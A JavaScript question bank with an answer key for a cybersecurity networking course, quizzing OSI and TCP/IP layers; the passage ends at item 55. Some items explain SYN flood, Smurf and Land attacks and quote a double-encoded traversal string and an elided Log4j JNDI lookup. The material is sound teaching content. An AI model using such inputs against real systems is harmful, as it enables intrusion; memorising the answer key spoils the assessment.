/**
 * Course 02: Computer Networking for Cybersecurity
 * Module 2 Question Bank: Layered Models and Encapsulation
 * Exactly 200 Questions (100 Medium, 100 Difficult)
 * Randomizable, scenario-driven with comprehensive architectural rationales.
 */

export const c2_module2QuestionBank = [
  {
    "id": "q_c2_m2_001",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which layer of the OSI reference model is responsible for establishing, managing, and terminating communication dialogues between applications?",
    "options": [
      "Layer 5 (Session Layer)",
      "Layer 4 (Transport Layer)",
      "Layer 6 (Presentation Layer)",
      "Layer 3 (Network Layer)"
    ],
    "correct": 0,
    "explanation": "The Session Layer (Layer 5) establishes, coordinates, and terminates dialogues and exchanges between software applications on remote hosts."
  },
  {
    "id": "q_c2_m2_002",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which OSI layer performs data format translation, syntax conversion, character encoding (such as UTF-8 vs ASCII), and serialization?",
    "options": [
      "Layer 7 (Application)",
      "Layer 6 (Presentation)",
      "Layer 5 (Session)",
      "Layer 4 (Transport)"
    ],
    "correct": 1,
    "explanation": "The Presentation Layer (Layer 6) handles how data is represented, ensuring standard formatting, character encodings, and syntax transformation."
  },
  {
    "id": "q_c2_m2_003",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "What is the primary function of Layer 2 (Data Link Layer) in the OSI 7-layer architecture?",
    "options": [
      "Routing packets across autonomous internetworks using logical addresses",
      "Delivering frames between directly connected nodes on the same local link using physical MAC addresses",
      "Providing end-to-end socket multiplexing via TCP and UDP ports",
      "Converting application text strings into binary machine code"
    ],
    "correct": 1,
    "explanation": "Layer 2 delivers data frames between directly connected network interface cards (NICs) across a single physical link using Media Access Control (MAC) addresses."
  },
  {
    "id": "q_c2_m2_004",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "A network switch inspects incoming data to determine which physical port to forward a frame to. At which OSI layer does this operation occur?",
    "options": [
      "Layer 1 (Physical)",
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)"
    ],
    "correct": 1,
    "explanation": "Standard network switches operate at Layer 2 (Data Link), reading the destination MAC address in the Ethernet frame header and matching it against their CAM table."
  },
  {
    "id": "q_c2_m2_005",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "At which OSI layer does a network router make path determination and packet forwarding decisions?",
    "options": [
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)",
      "Layer 5 (Session)"
    ],
    "correct": 1,
    "explanation": "Routers operate at Layer 3 (Network), evaluating destination logical IP addresses and consulting routing tables to determine egress interfaces."
  },
  {
    "id": "q_c2_m2_006",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which layer of the OSI model provides process-to-process communication, connection tracking, and port-based multiplexing?",
    "options": [
      "Layer 3 (Network)",
      "Layer 4 (Transport)",
      "Layer 5 (Session)",
      "Layer 6 (Presentation)"
    ],
    "correct": 1,
    "explanation": "Layer 4 (Transport) provides host-to-host and process-to-process delivery, tracking connections and multiplexing conversations using 16-bit port numbers."
  },
  {
    "id": "q_c2_m2_007",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "In the context of the OSI model, what is the critical distinction between a software application (like Google Chrome) and Layer 7 (Application Layer)?",
    "options": [
      "There is no distinction; software applications are synonymous with Layer 7.",
      "Layer 7 refers to the network communication protocol (e.g. HTTP, DNS), not the software program that invokes it.",
      "Software applications operate at Layer 6, whereas network protocols operate at Layer 7.",
      "Layer 7 strictly defines physical hardware human interface devices like keyboards and mice."
    ],
    "correct": 1,
    "explanation": "Layer 7 defines the application communication protocol (such as HTTP, SMTP, or SSH) that provides network services, not the executable program itself."
  },
  {
    "id": "q_c2_m2_008",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which sublayer of the OSI Data Link layer (IEEE 802.2) provides flow control and multiplexing for multiple network layer protocols over a single physical link?",
    "options": [
      "Media Access Control (MAC)",
      "Logical Link Control (LLC)",
      "Physical Medium Dependent (PMD)",
      "Physical Coding Sublayer (PCS)"
    ],
    "correct": 1,
    "explanation": "IEEE 802 divides the Data Link layer into LLC (802.2), which handles protocol multiplexing and flow control, and MAC (802.3/802.11), which handles framing and media access."
  },
  {
    "id": "q_c2_m2_009",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which mnemonic represents the top-down sequence of the OSI model layers from Layer 7 down to Layer 1?",
    "options": [
      "Please Do Not Throw Sausage Pizza Away",
      "All People Seem To Need Data Processing",
      "Every Good Boy Does Fine Always",
      "Never Underestimate The Power Of Networking"
    ],
    "correct": 1,
    "explanation": "'All People Seem To Need Data Processing' maps to Application, Presentation, Session, Transport, Network, Data Link, Physical (Layers 7 down to 1)."
  },
  {
    "id": "q_c2_m2_010",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which mnemonic represents the bottom-up sequence of the OSI model layers from Layer 1 up to Layer 7?",
    "options": [
      "All People Seem To Need Data Processing",
      "Please Do Not Throw Sausage Pizza Away",
      "Programmers Do Not Take Silly Protocol Actions",
      "Packet Delivery Never Takes Simple Paths Anywhere"
    ],
    "correct": 1,
    "explanation": "'Please Do Not Throw Sausage Pizza Away' maps to Physical, Data Link, Network, Transport, Session, Presentation, Application (Layers 1 up to 7)."
  },
  {
    "id": "q_c2_m2_011",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which device operates purely at Layer 1 (Physical Layer) by regenerating electrical signals to all connected ports without inspecting frame headers?",
    "options": [
      "Layer 2 Switch",
      "Passive Hub or Repeater",
      "Layer 3 Router",
      "Stateful Firewall"
    ],
    "correct": 1,
    "explanation": "Hubs and repeaters operate at Layer 1, repeating incoming electrical bit signals to all ports without inspecting MAC addresses or frame boundaries."
  },
  {
    "id": "q_c2_m2_012",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which OSI layer defines physical specifications such as cable pinouts, electrical signal voltages, fiber light wavelengths, and radio frequencies?",
    "options": [
      "Layer 1 (Physical)",
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)"
    ],
    "correct": 0,
    "explanation": "The Physical Layer (Layer 1) establishes electrical, optical, radio, and mechanical standards for signal transmission over physical media."
  },
  {
    "id": "q_c2_m2_013",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "At which OSI layer do Secure Shell (SSH), Simple Mail Transfer Protocol (SMTP), and Domain Name System (DNS) protocols reside?",
    "options": [
      "Layer 4 (Transport)",
      "Layer 5 (Session)",
      "Layer 6 (Presentation)",
      "Layer 7 (Application)"
    ],
    "correct": 3,
    "explanation": "SSH, SMTP, and DNS are Application Layer (Layer 7) protocols that provide network services directly to client and server applications."
  },
  {
    "id": "q_c2_m2_014",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which OSI layer is responsible for segmenting large application byte streams, numbering the segments, and acknowledging received segments when using TCP?",
    "options": [
      "Layer 3 (Network)",
      "Layer 4 (Transport)",
      "Layer 5 (Session)",
      "Layer 2 (Data Link)"
    ],
    "correct": 1,
    "explanation": "The Transport Layer (Layer 4) handles stream segmentation, sequence numbering, acknowledgements, and retransmissions."
  },
  {
    "id": "q_c2_m2_015",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which OSI layer is primarily targeted by an attacker conducting a physical wiretap on a copper twisted-pair cable?",
    "options": [
      "Layer 1 (Physical)",
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)"
    ],
    "correct": 0,
    "explanation": "Physical wiretapping directly intercepts electromagnetic or electrical signals traversing physical media at Layer 1."
  },
  {
    "id": "q_c2_m2_016",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which OSI layer handles network routing protocols like BGP and OSPF to distribute topology reachability between routers?",
    "options": [
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)",
      "Layer 7 (Application)"
    ],
    "correct": 1,
    "explanation": "While routing protocols may be transported via TCP or UDP, their core function is managing routing tables and logical paths at Layer 3."
  },
  {
    "id": "q_c2_m2_017",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "When an endpoint application initiates an RPC (Remote Procedure Call) request to coordinate a distributed transaction, which classic OSI layer manages this dialogue?",
    "options": [
      "Layer 4 (Transport)",
      "Layer 5 (Session)",
      "Layer 6 (Presentation)",
      "Layer 3 (Network)"
    ],
    "correct": 1,
    "explanation": "The Session Layer (Layer 5) manages dialogues, synchronization tokens, and RPC session contexts between remote applications."
  },
  {
    "id": "q_c2_m2_018",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which OSI layer is directly responsible for framing raw bits into discrete blocks and appending a cyclic redundancy check (CRC) trailer?",
    "options": [
      "Layer 1 (Physical)",
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)"
    ],
    "correct": 1,
    "explanation": "Layer 2 (Data Link) frames bits into structured units and calculates a Frame Check Sequence (FCS) trailer for error detection."
  },
  {
    "id": "q_c2_m2_019",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "What is the role of Layer 4 port numbers in operating systems?",
    "options": [
      "To identify the geographical location of a server",
      "To multiplex incoming network traffic to specific software processes and sockets",
      "To authenticate the user's password before granting access",
      "To encrypt the physical cable connection"
    ],
    "correct": 1,
    "explanation": "Port numbers identify distinct listening processes and sockets on an endpoint, allowing multiple applications to share a single IP address."
  },
  {
    "id": "q_c2_m2_020",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which OSI layer do Media Converters (converting UTP copper 1000BASE-T to fiber 1000BASE-SX) operate within?",
    "options": [
      "Layer 1 (Physical)",
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)"
    ],
    "correct": 0,
    "explanation": "Media converters translate electrical voltages into optical light pulses at Layer 1 without modifying Layer 2 frame contents."
  },
  {
    "id": "q_c2_m2_021",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "When an attacker performs a SYN flood attack to exhaust server connection tables, which OSI layer is the primary operational vector?",
    "options": [
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)",
      "Layer 7 (Application)"
    ],
    "correct": 2,
    "explanation": "SYN floods exploit the TCP connection handshake state table at Layer 4 (Transport Layer)."
  },
  {
    "id": "q_c2_m2_022",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which OSI layer is responsible for logical IP addressing and preventing packets from circulating forever via hop count limits (TTL)?",
    "options": [
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)",
      "Layer 5 (Session)"
    ],
    "correct": 1,
    "explanation": "Layer 3 (Network) manages logical addressing and decrements the Time-to-Live (TTL) field at each hop to eliminate routing loops."
  },
  {
    "id": "q_c2_m2_023",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which layer of the OSI model does a Web Application Firewall (WAF) inspect when evaluating HTTP headers for Cross-Site Scripting (XSS)?",
    "options": [
      "Layer 3 (Network)",
      "Layer 4 (Transport)",
      "Layer 6 (Presentation)",
      "Layer 7 (Application)"
    ],
    "correct": 3,
    "explanation": "WAFs operate at Layer 7 (Application Layer), reassembling HTTP streams to inspect URLs, headers, cookies, and payloads for web exploits."
  },
  {
    "id": "q_c2_m2_024",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "Which OSI layer is responsible for media access contention protocols such as CSMA/CD on Ethernet and CSMA/CA on Wi-Fi?",
    "options": [
      "Layer 1 (Physical)",
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)"
    ],
    "correct": 1,
    "explanation": "Media access control mechanisms (CSMA/CD and CSMA/CA) reside in the MAC sublayer of Layer 2 (Data Link)."
  },
  {
    "id": "q_c2_m2_025",
    "topic": "OSI Model Architecture",
    "difficulty": "medium",
    "q": "If a physical patch cable is unplugged from a workstation NIC, which layer is experiencing the primary failure?",
    "options": [
      "Layer 1 (Physical)",
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)"
    ],
    "correct": 0,
    "explanation": "An unplugged cable represents a physical layer (Layer 1) disconnection; link state is down."
  },
  {
    "id": "q_c2_m2_026",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "An enterprise security engineer audits an intrusion detection system (IDS) alert showing an attack exploiting ASN.1 parsing vulnerabilities inside a cryptographic certificate library. At which OSI layer does this vulnerability reside?",
    "options": [
      "Layer 7 (Application Layer)",
      "Layer 6 (Presentation Layer)",
      "Layer 5 (Session Layer)",
      "Layer 4 (Transport Layer)"
    ],
    "correct": 1,
    "explanation": "ASN.1 is an Abstract Syntax Notation standard governing data encoding and serialization, making ASN.1 parsing flaws classic Layer 6 (Presentation Layer) vulnerabilities."
  },
  {
    "id": "q_c2_m2_027",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "Why is it technically inaccurate to categorize Transport Layer Security (TLS) as residing purely in OSI Layer 4 or OSI Layer 7?",
    "options": [
      "TLS requires dedicated physical cryptographic coprocessors at Layer 1.",
      "TLS sits as a cryptographic shim on top of Layer 4 TCP transport while providing Presentation/Session services to Layer 7 protocols.",
      "TLS operates strictly at Layer 2 inside IEEE 802.1AE MACsec frames.",
      "TLS replaces the IPv4 header at Layer 3 with an encrypted routing tag."
    ],
    "correct": 1,
    "explanation": "TLS does not fit neatly into one OSI layer: it relies on Layer 4 TCP for reliable byte-stream transport while providing encryption, presentation formatting, and session negotiation to Layer 7 applications."
  },
  {
    "id": "q_c2_m2_028",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "A multi-layer core switch is configured with Access Control Lists (ACLs) that filter traffic based on source IP, destination IP, and TCP destination port. Up to which OSI layer is this switch processing traffic for filtering purposes?",
    "options": [
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)",
      "Layer 7 (Application)"
    ],
    "correct": 2,
    "explanation": "Because the ACL evaluates IP addresses (Layer 3) and TCP port numbers (Layer 4), the switch inspects headers up to Layer 4."
  },
  {
    "id": "q_c2_m2_029",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "During an incident investigation, a forensic analyst observes that an adversary bypassed a perimeter firewall by encoding directory traversal characters as double URL encoding (%252e%252e%252f). Which layer's interpretation mechanics were exploited?",
    "options": [
      "Layer 4 (Transport Layer)",
      "Layer 6 (Presentation Layer)",
      "Layer 3 (Network Layer)",
      "Layer 2 (Data Link Layer)"
    ],
    "correct": 1,
    "explanation": "Character normalization and URL decoding represent presentation-layer syntax transformations (Layer 6); when intermediate inspection devices decode once but backend applications decode twice, evasion occurs."
  },
  {
    "id": "q_c2_m2_030",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "How does peer-to-peer layer communication differ fundamentally from the actual physical path that electrical signals traverse during transmission?",
    "options": [
      "Peer layers physically exchange packets directly through dedicated radio beams, bypassing intermediate devices.",
      "Peer layers communicate logically using their layer protocol, but data must physically travel down the sender's stack to Layer 1, across the physical medium, and up the receiver's stack.",
      "Peer layer communication occurs only when both hosts belong to the same local broadcast domain.",
      "Peer communication requires routers to reassemble all seven layers at every intermediate hop."
    ],
    "correct": 1,
    "explanation": "Logical peer communication means Layer 4 on Host A talks logically to Layer 4 on Host B via TCP headers, but physically data must flow down Host A's stack, across Layer 1 links, through intermediate devices, and up Host B's stack."
  },
  {
    "id": "q_c2_m2_031",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "Which OSI layer boundary is crossed when a modern Layer 3 switch performs Inter-VLAN routing?",
    "options": [
      "It operates exclusively at Layer 1 by bridging copper cables.",
      "It moves frames between Layer 2 broadcast domains (VLANs) by inspecting and routing Layer 3 IP packets.",
      "It translates Layer 6 character encodings between different operating systems.",
      "It proxies Layer 7 HTTP requests between client browsers and web caches."
    ],
    "correct": 1,
    "explanation": "Inter-VLAN routing terminates Layer 2 broadcast frames on a virtual interface (SVI), inspects the Layer 3 destination IP, and routes the packet into a different Layer 2 VLAN."
  },
  {
    "id": "q_c2_m2_032",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "A security engineer analyzes an exploit that injects a TCP RST packet with a forged sequence number to terminate an active BGP peering session. Which OSI layers are directly involved in the construction and consequence of this attack?",
    "options": [
      "Layer 1 physical link noise causing Layer 2 frame drops",
      "Layer 4 TCP reset injection terminating a Layer 3/7 BGP routing dialogue",
      "Layer 6 character encoding corruption crashing Layer 7 web servers",
      "Layer 2 MAC spoofing causing Layer 1 optical transceiver failure"
    ],
    "correct": 1,
    "explanation": "The attacker injects a forged Layer 4 TCP segment (RST flag) to tear down the transport connection, collapsing the Layer 7/Layer 3 BGP routing session."
  },
  {
    "id": "q_c2_m2_033",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "In an industrial control network, an engineer discovers that PLCs communicate over Modbus TCP. A stateful firewall permits TCP port 502, but an attacker transmits a malicious 'Force Multiple Coils' function code that causes physical damage. What cross-layer architectural flaw is demonstrated?",
    "options": [
      "The firewall operated at Layer 4 and permitted the port, but lacked Layer 7 industrial deep packet inspection to validate application function codes.",
      "The switch failed to verify the physical copper impedance at Layer 1.",
      "The router corrupted the Layer 2 Ethernet CRC checksum.",
      "The PLC failed to negotiate a Layer 5 RPC session token."
    ],
    "correct": 0,
    "explanation": "A Layer 4 firewall allows TCP port 502 traffic unconditionally without evaluating whether the Layer 7 Modbus payload contains dangerous unauthorized operational commands."
  },
  {
    "id": "q_c2_m2_034",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "Why do intermediate Layer 2 switches typically refrain from inspecting or verifying Layer 3 IP header checksums?",
    "options": [
      "Switches lack central processing units (CPUs).",
      "Layer 2 switches are engineered in hardware (ASICs) to forward frames based strictly on Layer 2 MAC addresses, avoiding the latency and processing overhead of parsing higher-layer headers.",
      "IP header checksums are encrypted by default.",
      "Ethernet frames do not contain IP packets."
    ],
    "correct": 1,
    "explanation": "Switches forward frames at line rate using specialized hardware (ASICs) that inspects only Layer 2 MAC headers; parsing Layer 3 headers would add unnecessary latency and violate layer separation."
  },
  {
    "id": "q_c2_m2_035",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "Which OSI layer is responsible for determining the maximum size of application data that can be transmitted without fragmentation across an end-to-end path (Path MTU)?",
    "options": [
      "Layer 2 negotiation via ARP",
      "Layer 3 cooperation using ICMP Fragmentation Needed feedback combined with Layer 4 TCP MSS clamping",
      "Layer 6 XML schema negotiation",
      "Layer 1 cable impedance measurement"
    ],
    "correct": 1,
    "explanation": "Path MTU Discovery relies on Layer 3 IP DF flags and ICMP Type 3 Code 4 messages, coordinating with Layer 4 TCP MSS calculations."
  },
  {
    "id": "q_c2_m2_036",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "An attacker uses a rogue access point that transmits 802.11 Deauthentication frames to disconnect enterprise users. At which OSI layer does this denial-of-service attack occur?",
    "options": [
      "Layer 1 (Physical)",
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)"
    ],
    "correct": 1,
    "explanation": "802.11 management frames (such as Deauthentication) operate at Layer 2 (Data Link); unencrypted management frames allow attackers to spoof the AP MAC address."
  },
  {
    "id": "q_c2_m2_037",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "A security architect specifies IEEE 802.1AE (MACsec) for all inter-switch trunk links in a financial data center. At which OSI layer does MACsec provide cryptographic confidentiality and integrity?",
    "options": [
      "Layer 1 (Physical)",
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)"
    ],
    "correct": 1,
    "explanation": "MACsec (IEEE 802.1AE) provides connectionless data confidentiality, integrity, and authenticity at Layer 2 (Data Link Layer) directly on Ethernet frames."
  },
  {
    "id": "q_c2_m2_038",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "Which OSI layer is responsible for translating a domain name like 'intranet.secure.corp' into an IP address '10.20.30.40'?",
    "options": [
      "Layer 3 (Network)",
      "Layer 7 (Application)",
      "Layer 2 (Data Link)",
      "Layer 4 (Transport)"
    ],
    "correct": 1,
    "explanation": "Domain Name System (DNS) is an Application Layer (Layer 7) protocol that services name resolution queries for client applications."
  },
  {
    "id": "q_c2_m2_039",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "Why is IPsec classified primarily as a Layer 3 security suite, unlike TLS which operates above Layer 4?",
    "options": [
      "IPsec encrypts and authenticates entire IP packets (Network Layer), protecting all transport protocols and applications transparently without application modifications.",
      "IPsec operates directly on optical transceivers at Layer 1.",
      "IPsec only secures web browser HTTP sessions.",
      "IPsec requires special physical Ethernet cables."
    ],
    "correct": 0,
    "explanation": "IPsec operates at Layer 3 (Network), encapsulating and protecting entire IP packets (including TCP, UDP, ICMP, and application payloads) transparently to end applications."
  },
  {
    "id": "q_c2_m2_040",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "An attacker transmits an IP packet with identical source and destination IP addresses and identical source and destination port numbers (a Land attack). Which OSI layers are manipulated?",
    "options": [
      "Layer 1 and Layer 2",
      "Layer 3 (Network IP) and Layer 4 (Transport Port)",
      "Layer 5 and Layer 6",
      "Layer 6 and Layer 7"
    ],
    "correct": 1,
    "explanation": "The Land attack crafts packets where Layer 3 (IP addresses) and Layer 4 (TCP ports) match between source and destination, causing vulnerable operating systems to lock up in a loop."
  },
  {
    "id": "q_c2_m2_041",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "When comparing Layer 4 load balancers to Layer 7 load balancers, what is the primary architectural difference in inspection depth?",
    "options": [
      "Layer 4 balancers inspect HTTP cookies and SSL certificates, whereas Layer 7 balancers only inspect IP addresses.",
      "Layer 4 balancers make routing decisions based strictly on IP addresses and TCP/UDP ports without terminating the connection, whereas Layer 7 balancers terminate TCP/TLS and inspect full HTTP headers, URLs, and cookies.",
      "Layer 4 balancers operate on optical fiber lasers, whereas Layer 7 balancers operate on Wi-Fi radio frequencies.",
      "Layer 7 balancers do not support TCP connections."
    ],
    "correct": 1,
    "explanation": "Layer 4 load balancers route packets using IP and port hashes without inspecting payloads; Layer 7 load balancers terminate TCP and TLS, parsing HTTP headers, URIs, and cookies to make intelligent routing decisions."
  },
  {
    "id": "q_c2_m2_042",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "In an incident where an adversary exploits a remote code execution vulnerability in Apache Log4j (CVE-2021-44228), what layer was the initial malicious JNDI lookup string embedded within?",
    "options": [
      "Layer 2 Ethernet preamble",
      "Layer 3 IPv4 Options field",
      "Layer 4 TCP sequence number",
      "Layer 7 Application payload (HTTP User-Agent or header)"
    ],
    "correct": 3,
    "explanation": "Log4j was exploited by passing malicious JNDI string lookups (e.g. `${jndi:ldap://...}`) inside Layer 7 HTTP request headers (like User-Agent or X-Forwarded-For) logged by Java applications."
  },
  {
    "id": "q_c2_m2_043",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "Why does a physical layer jammer cause complete network disruption even if all switches, routers, and firewalls are perfectly hardened?",
    "options": [
      "Jammers alter the root passwords of Layer 3 routers.",
      "Radio frequency jamming floods the physical medium (Layer 1) with noise, preventing receivers from distinguishing legitimate signal transitions and causing continuous physical frame reception failures.",
      "Jammers poison the Layer 2 CAM tables.",
      "Jammers decrypt TLS 1.3 session keys."
    ],
    "correct": 1,
    "explanation": "Physical layer jamming raises the noise floor on the transmission medium, rendering it impossible for transceivers to detect or decode valid bits, collapsing all higher-layer communications."
  },
  {
    "id": "q_c2_m2_044",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "An enterprise deploys 802.1X Network Access Control (NAC) on switch access ports. At which OSI layer does 802.1X block unauthorized frames before authentication completes?",
    "options": [
      "Layer 1 (Physical)",
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 7 (Application)"
    ],
    "correct": 1,
    "explanation": "IEEE 802.1X operates at Layer 2 (Data Link Layer); until the client successfully authenticates via EAPoL, the switch port remains in an unauthorized state, dropping all non-EAP frames."
  },
  {
    "id": "q_c2_m2_045",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "How does a Next-Generation Firewall (NGFW) distinguish between legitimate HTTPS traffic and a malicious SSH tunnel executing on TCP port 443?",
    "options": [
      "It evaluates the physical cable category at Layer 1.",
      "It performs deep packet inspection (DPI) at Layer 7, analyzing protocol handshake signatures to verify TLS protocol compliance rather than trusting the Layer 4 port number.",
      "It inspects the Layer 2 MAC address OUI vendor bytes.",
      "It modifies the IPv4 TTL hop count to force an ICMP timeout."
    ],
    "correct": 1,
    "explanation": "NGFWs inspect protocol structures at Layer 7; they recognize that an SSH handshake signature does not match TLS ClientHello standards, alerting or dropping the unauthorized tunnel."
  },
  {
    "id": "q_c2_m2_046",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "When an attacker performs a Smurf attack, what two protocols across Layer 3 are abused?",
    "options": [
      "TCP SYN packets and BGP keepalives",
      "ICMP Echo Requests sent to an IP directed broadcast address with a spoofed victim source IP",
      "ARP requests and DNS SRV records",
      "DHCP Discover frames and IGMP joins"
    ],
    "correct": 1,
    "explanation": "A Smurf attack broadcasts Layer 3 ICMP Echo Requests with the victim's spoofed source IP address, causing all nodes on the target subnet to flood the victim with ICMP Echo Replies."
  },
  {
    "id": "q_c2_m2_047",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "Why does an end-to-end TLS session prevent a Layer 3 transit router from inspecting application HTTP headers?",
    "options": [
      "The router's NIC automatically drops encrypted packets.",
      "TLS encrypts everything above Layer 4; intermediate routers only decapsulate up to Layer 3 to read IP headers for routing, leaving the encrypted payload opaque.",
      "Routers are legally prohibited from inspecting payloads.",
      "TLS overwrites the destination IP address with random characters."
    ],
    "correct": 1,
    "explanation": "Routers only process up to Layer 3 to forward packets; furthermore, the application payload (above TCP) is encrypted with symmetric session keys known only to the two endpoints."
  },
  {
    "id": "q_c2_m2_048",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "A network analyst observes high latency and jitter on VoIP calls. QoS (Quality of Service) tagging using DSCP operates at which OSI layer to prioritize audio traffic?",
    "options": [
      "Layer 2 CoS in 802.1Q tags and Layer 3 DSCP in IPv4 headers",
      "Layer 7 SIP user agents only",
      "Layer 1 physical voltage boost",
      "Layer 5 NetBIOS keepalives"
    ],
    "correct": 0,
    "explanation": "QoS prioritization operates at Layer 2 (802.1p CoS within 802.1Q tags) and Layer 3 (DSCP field in the IP header) to prioritize packets across network devices."
  },
  {
    "id": "q_c2_m2_049",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "What is the operational consequence if an intermediate router encounters an IP packet larger than its egress MTU when the Don't Fragment (DF) bit is set to 1?",
    "options": [
      "The router fragments the packet anyway and ignores the DF bit.",
      "The router discards the packet and transmits an ICMP Type 3 Code 4 ('Fragmentation Needed and DF set') message back to the source IP.",
      "The router compresses the payload using gzip at Layer 6.",
      "The router switches the packet to a Layer 2 frame relay."
    ],
    "correct": 1,
    "explanation": "If a packet exceeds egress MTU and DF=1, the router must discard the packet and notify the sender via an ICMP 'Fragmentation Needed' error message."
  },
  {
    "id": "q_c2_m2_050",
    "topic": "OSI Model Architecture",
    "difficulty": "difficult",
    "q": "In zero-trust architecture, why is 'defense-in-depth across layers' considered mandatory?",
    "options": [
      "Because controls at a single layer can always be bypassed by attacks at layers above or below (e.g. L4 firewalls cannot stop L7 SQLi, and TLS cannot stop endpoint memory theft).",
      "Because modern firewalls only support one layer at a time.",
      "Because international regulations require seven different physical firewalls.",
      "Because packet switching does not function without multiple firewalls."
    ],
    "correct": 0,
    "explanation": "No single layer's security control can prevent attacks at other layers; comprehensive defense requires controls at the physical, link, network, transport, and application layers."
  },
  {
    "id": "q_c2_m2_051",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "How many functional layers are defined in the canonical TCP/IP architecture specified in RFC 1122?",
    "options": [
      "Seven layers",
      "Four layers",
      "Five layers",
      "Three layers"
    ],
    "correct": 1,
    "explanation": "RFC 1122 formally specifies four layers for the internet architecture: Link, Internet, Transport, and Application."
  },
  {
    "id": "q_c2_m2_052",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which layer of the 4-layer TCP/IP model corresponds directly to OSI Layer 3 (Network Layer)?",
    "options": [
      "Transport Layer",
      "Internet Layer",
      "Link Layer",
      "Application Layer"
    ],
    "correct": 1,
    "explanation": "The Internet Layer of the TCP/IP model corresponds directly to OSI Layer 3, handling logical IP addressing and routing."
  },
  {
    "id": "q_c2_m2_053",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which OSI layers are consolidated into the single 'Application Layer' within the RFC 1122 TCP/IP model?",
    "options": [
      "Layers 1, 2, and 3",
      "Layers 4 and 5",
      "Layers 5 (Session), 6 (Presentation), and 7 (Application)",
      "Layers 6 and 7 only"
    ],
    "correct": 2,
    "explanation": "The TCP/IP Application layer combines the functions of OSI Layer 5 (Session), Layer 6 (Presentation), and Layer 7 (Application)."
  },
  {
    "id": "q_c2_m2_054",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "In the 4-layer TCP/IP suite, which protocols operate primarily at the Transport Layer?",
    "options": [
      "HTTP and DNS",
      "TCP and UDP",
      "IPv4 and IPv6",
      "Ethernet and Wi-Fi"
    ],
    "correct": 1,
    "explanation": "TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) are the core Transport layer protocols in the TCP/IP suite."
  },
  {
    "id": "q_c2_m2_055",
